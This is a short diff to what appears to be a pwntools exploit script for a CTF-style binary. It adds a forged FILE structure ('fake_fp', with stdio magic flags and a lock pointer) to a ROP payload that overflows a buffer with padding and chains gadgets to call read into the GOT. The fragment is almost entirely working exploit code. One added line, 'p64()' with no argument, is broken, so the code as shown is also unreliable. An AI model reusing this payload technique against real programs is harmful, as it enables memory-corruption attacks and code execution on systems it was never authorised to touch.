@@ -23,6 +23,12 @@ addr_plt_fflush = elf.plt['fflush']
 addr_stdout = elf.symbols['_IO_2_1_stdout_']
 addr_plt_read = elf.plt['read']
 
+fake_fp = p64(0xfbad2084)
+fake_fp += p64(0)*16
+fake_fp += p64(addr_stdout+0x200) #lock
+fake_fp += p64(0)*((0xd8 - len(fake_fp))/8)
+fake_fp += p64()
+
 payload += 'A'*(size - len(payload))
 payload += p64(addr_popRDIret) + p64(0) + p64(addr_popRSIret) + p64(addr_got_ff) + p64(addr_popRDXret)+ p64(0xe0)+ p64(addr_plt_read)
 payload += p64(addr_got_memset)
